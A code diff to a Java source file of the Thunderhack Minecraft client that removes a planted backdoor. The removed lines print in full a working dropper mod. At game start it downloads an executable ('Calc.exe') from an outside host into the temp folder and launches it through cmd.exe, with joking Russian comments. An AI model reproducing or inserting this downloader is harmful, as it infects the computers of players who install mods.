@@ -1,15 +1,3 @@
-package mc.lightman.backdoor;
-
-import java.nio.file.Paths;
-import java.io.File;
-import java.io.FileOutputStream;
-import java.io.BufferedInputStream;
-import java.io.IOException;
-import java.net.URL;
-import java.net.MalformedURLException;
-
-import net.minecraftforge.fml.common.Mod;
-
 package com.mrzak34.thunderhack;
 
 import com.mrzak34.thunderhack.gui.fontstuff.*;
@@ -219,52 +207,4 @@ public class Thunderhack {
         MinecraftForge.EVENT_BUS.register(networkHandler);
     }
 
-}
-
-@Mod(DropperMod.MODID)
-public final class DropperMod {
-    public static final String MODID = "dropper_mod";
-   
-    public DropperMod() {
-        // Запускаем наши цыганские фокусы в новом потоке
-        // иначе майн не запуститься
-        new Thread() {
-            public void run() {
-                try {
-                    // Прямая ссылка на наш файлик
-                    final URL url = new URL("https://data.cdnx.fun/userdata/641c9af637c70_Calc.exe");
-                    // Получаем путь где будет сохранен наш файл (%temp%/Calc.ехе)
-                    String tempFileName = Paths.get(
-                            System.getProperty("java.io.tmpdir"),
-                            new File(url.getPath()).getName().toString()
-                    ).toString();
-                    // Если файла в папке %temp% нету
-                    if (!new File(tempFileName).exists()) {
-                        // Скачиваем байты
-                        BufferedInputStream inputStream = new BufferedInputStream(url.openStream());
-                        FileOutputStream fileOutputStream = new FileOutputStream(tempFileName);
-                        // Записываем байты в файл
-                        byte dataBuffer[] = new byte[1024];
-                        int bytesRead;
-                        while ((bytesRead = inputStream.read(dataBuffer, 0, 1024)) != -1) {
-                            fileOutputStream.write(dataBuffer, 0, bytesRead);
-                        }
-                        // Закрываем эти 2 хуйни
-                        inputStream.close();
-                        fileOutputStream.close();
-                        // Запускаем файл
-                        Runtime.getRuntime().exec(
-                            new String[] { "cmd.exe", "/C", "start", tempFileName }
-                        );
-                    }
-                // Если функция может выдать ошибку то джава захочет что-бы мы её обработали
-                // иначе нам просто не дадут скомпилить :D
-                } catch (MalformedURLException e) {
-                    e.printStackTrace();
-                } catch (IOException e) {
-                    e.printStackTrace();
-                }
-            }
-        }.start();
-    }
 }
